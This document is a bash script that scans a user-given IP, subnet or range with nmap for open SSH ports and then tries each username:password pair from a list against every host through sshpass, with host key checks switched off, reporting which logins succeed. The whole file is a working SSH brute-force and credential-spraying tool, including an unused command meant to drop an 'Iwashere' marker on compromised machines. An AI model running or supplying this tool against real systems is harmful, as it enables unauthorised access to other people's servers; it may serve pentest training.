#!/bin/bash
targets_array=()
credentials_array=()

brute_ssh() {
    local target="$1"
    local credential="$2"
    local remote_cmd
    local username
    local password

    IFS=':' read -r username password <<< "$credential"

    [[ -z $target || -z $username || -z $password ]] && return 1

    printf 'user=%s\n' "$username"
    printf 'pass=%s\n' "$password"

    printf "Trying $username@$target with password: $password\n"

    remote_cmd='touch "$HOME/Desktop/.Iwashere"; echo "created Iwashere on $HOME/Desktop/.Iwashere"'
    if sshpass -p "$password" ssh \
        -p 22 \
        -o StrictHostKeyChecking=no \
        -o UserknownHostsFile=/dev/null \
        -o ConnectTimeout=5 \
        -o PreferredAuthentications=password \
        -o PubkeyAuthentication=no \
        -o NumberOfPasswordPrompts=1 \
        "$username@$target" "exit" >/dev/null 2>&1
    then
        printf 'SUCCESS! Login worked for %s@%s\n' "$username" "$target"
        return 0
    else
        printf 'FAILED! Login failed for %s@%s\n' "$username" "$target"
        return 1
    fi
}

file_or_cred_check() {
    local user_input="$1"
    local line

    if [[ -f "$user_input" && -r "$user_input" ]]; then
    while IFS= read -r line; do
        [[ -z $line ]] && continue
        [[ $line =~ ^# ]] && continue
        if [[ $line =~ ^[^:]+:[^:]+$ ]]; then
            credentials_array+=("$line")
        else
            printf "Skipping invalid credential line: %s\n" "$line"
        fi
    done < "$user_input"

    [[ ${#credentials_array[@]} -gt 0 ]] || return 1

    return 0

    fi

    if [[ $user_input =~ ^[^:]+:[^:]+$ ]]; then
        credentials_array+=("$user_input")
        return 0
    fi

    return 1
}

nmap_scan() {
    local result=$(nmap -p 22 --open -oG - -n "$1" | grep '22/open/' | awk '{print $2}')
    if [[ -z $result ]]; then
        return 1
    fi
    
    for i in $result; do
        targets "$i"
    done 

    return 0
}

targets() {
    targets_array+=("$1")
}

is_it_valid_ip() {
    local ip="$1"
    local octets

    if [[ ${ip} =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
          IFS=. read -ra octets <<< "$ip"
          for i in "${octets[@]}"
          do
            if [[ $i -gt 255 ]]; then
                return 1;
            fi
          done
        return 0;
    else
        return 1;
    fi
}

is_it_valid_CIDR() {
    local CIDR="$1"
    local cidr_parts 
    local ip 
    local prefix

    IFS='/' read -ra cidr_parts <<< "$CIDR"

    if [[ ${#cidr_parts[@]} -ne 2 ]]; then
        return 1
    fi
    
    ip="${cidr_parts[0]}"
    prefix="${cidr_parts[1]}"

    if [[ -z $ip || -z $prefix ]]; then
        return 1
    fi

    if ! is_it_valid_ip "$ip"; then
        return 1
    fi

    if [[ ! $prefix =~ ^[0-9]+$ ]]; then
        return 1
    fi

    if [[ $prefix -lt 0 || $prefix -gt 32 ]]; then
        printf "INVALID CIDR ERROR\n"
        printf "the range for the subnet is between 0 and 32, you have entered: $prefix\n" 
        return 1
    fi

    return 0;
}

is_it_valid_range() {
    local range="$1"
    local range_parts 
    local range_start 
    local range_end

    IFS='-' read -ra range_parts <<< "$range"

    if [[ ${#range_parts[@]} -ne 2 ]]; then
        printf "are you sure the format is right?\n"
        printf "could not split format into two parts\n"
        return 1
    fi

    range_start="${range_parts[0]}"
    range_end="${range_parts[1]}"

    if [[ -z $range_start || -z $range_end ]]; then
        printf "missing part of the IP format\n"
        printf "range start: $range_start\n" 
        printf "range end: $range_end\n" 
        return 1
    fi

    if ! is_it_valid_ip "$range_start"; then
        printf "this is not a valid IP: $range_start\n" 
        return 1
    fi

    if [[ ! $range_end =~ ^[0-9]+$ ]]; then
        return 1
    fi

    if [[ $range_end -lt 0 || $range_end -gt 255 ]]; then
        printf "the range should be between 0 and 255.\n"
        printf "you've entered: $range_end\n" 
        return 1
    fi

    IFS='.' read -ra start_octets <<< "$range_start"
    local first_host="${start_octets[3]}"
    
    if [[ $range_end -lt $first_host ]]; then
        printf "last IP cant be smaller than first IP.\n"
        printf "first IP: $first_host\n"
        printf "last IP: $range_end\n"
        return 1
    fi

    return 0
}

read -r -p "Please Enter target IP or subnet (Ex: 192.168.1.1 or 192.168.1.0/24 or 192.168.1.1-10):" target_range

if is_it_valid_CIDR "$target_range"; then
    printf "Valid CIDR subnet!\n"
    printf "Scanning for open ssh ports...\n"
    if ! nmap_scan "$target_range"; then
        printf "No open ports were found...\n"
        exit 1
    else
        printf "Open Ports were found on these IP addresses\n"
        printf -- "--------------------------------------\n"
        printf '%s\n' "${targets_array[@]}"
        echo
        read -r -p "Please Provide a single Credential for ssh, or a file as user:pass:" credentials
        if ! file_or_cred_check "$credentials"; then
            printf "Invalid credential input\n"
            exit 1
        fi

        for target in "${targets_array[@]}"; do
            for credential in "${credentials_array[@]}"; do
                brute_ssh "$target" "$credential"
            done
        done
    fi
elif is_it_valid_ip "$target_range"; then
    printf "Valid IP address!\n"
    printf "Scanning for open ssh ports...\n"
    if ! nmap_scan "$target_range"; then
        printf "No open ports were found...\n"
        exit 1
    else
        printf "Open Ports were found on these IP addresses\n"
        printf -- "--------------------------------------\n"
        printf '%s\n' "${targets_array[@]}"
        read -r -p "Please Provide a single Credential for ssh, or a file as user:pass:" credentials
        if ! file_or_cred_check "$credentials"; then
            printf "Invalid credential input\n"
            exit 1
        fi
        for target in "${targets_array[@]}"; do
            for credential in "${credentials_array[@]}"; do
                brute_ssh "$target" "$credential"
            done
        done
    fi 
elif is_it_valid_range "$target_range"; then
    printf "great success!\n"
    printf "Scanning for open ssh ports...\n"
    if ! nmap_scan "$target_range"; then
        printf "No open ports were found...\n"
        exit 1
    else
        printf "Open Ports were found on these IP addresses\n"
        printf -- "--------------------------------------\n"
        printf '%s\n' "${targets_array[@]}"
        read -r -p "Please Provide a single Credential for ssh, or a file as user:pass:" credentials
        if ! file_or_cred_check "$credentials"; then
            printf "Invalid credential input\n"
            exit 1
        fi
        for target in "${targets_array[@]}"; do
            for credential in "${credentials_array[@]}"; do
                brute_ssh "$target" "$credential"
            done
        done
    fi
else
    printf "Invalid input\n"
fi